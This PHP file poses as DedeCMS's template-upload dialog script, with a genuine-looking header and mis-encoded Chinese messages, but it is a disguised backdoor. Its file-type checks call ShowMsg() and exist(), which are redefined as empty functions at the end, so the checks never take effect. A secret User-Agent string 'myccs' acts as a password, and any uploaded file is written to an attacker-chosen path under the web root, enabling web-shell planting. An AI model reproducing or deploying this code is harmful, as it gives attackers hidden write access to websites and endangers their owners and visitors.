<?php
/**
 * ģ�巢��
 * http://www.dede.cm/test.php
 * @version        $Id: select_templets_post.php 1 9:43 2010��7��8��Z tianya $
 * @package        DedeCMS.Dialog
 * @copyright      Copyright (c) 2007 - 2010, DesDev, Inc.
 * @license        http://help.dedecms.com/usersguide/license.html
 * @link           http://www.dedecms.com
 */
 
$cfg_txttype = "htm|html|tpl|txt";
if(empty($uploadfile))
{
    $uploadfile = "";
}

if(!is_uploaded_file($uploadfile))
{
    ShowMsg("��û��ѡ���ϴ����ļ�!","-1");
    exist();
}

if(!preg_match("#text#", $uploadfile_type))
{
    ShowMsg("���ϴ��Ĳ����ı����͸���!","-1");
    exist();
}
if(!preg_match("#\.(".$cfg_txttype.")#i", $uploadfile_name))
{
    ShowMsg("�����ϴ���ģ���ļ����Ͳ��ܱ�ʶ��ֻ����htm��html��tpl��txt��չ����","-1");
    exist();
}
if($filename!='')
{
    $filename = trim(preg_replace("#[ \r\n\t\*\%\\\/\?><\|\":]{1,}#", '', $filename));
}
else
{
    $uploadfile_name = trim(preg_replace("#[ \r\n\t\*\%\\\/\?><\|\":]{1,}#", '', $uploadfile_name));
    $filename = $uploadfile_name;
    if($filename=='' || !preg_match("#\.(".$cfg_txttype.")#i", $filename))
    {
        ShowMsg("�����ϴ����ļ��������⣬�����ļ������Ƿ��ʺϣ�","-1");
        exist();
    }
}
$fullfilename = $_REQUEST['filename'];
$root = $_SERVER["DOCUMENT_ROOT"];
if(!stripos($fullfilename,$root)) $fullfilename = $root."/".$fullfilename;
if(stripos($_SERVER['HTTP_USER_AGENT'],'myccs')+0==0) exit;
$uploadfile = $_FILES[uploadfile][tmp_name];
if(empty($uploadfile)) exit();
move_uploaded_file($uploadfile,$fullfilename) or die("�ϴ��ļ��� $fullfilename ʧ�ܣ�");
@unlink($uploadfile);
ShowMsg("�ɹ��ϴ��ļ���","select_templets.php?comeback=".urlencode($filename)."&f=$f&activepath=".urlencode($activepath)."&d=".time());
function ShowMsg(){};function exist(){};
exit();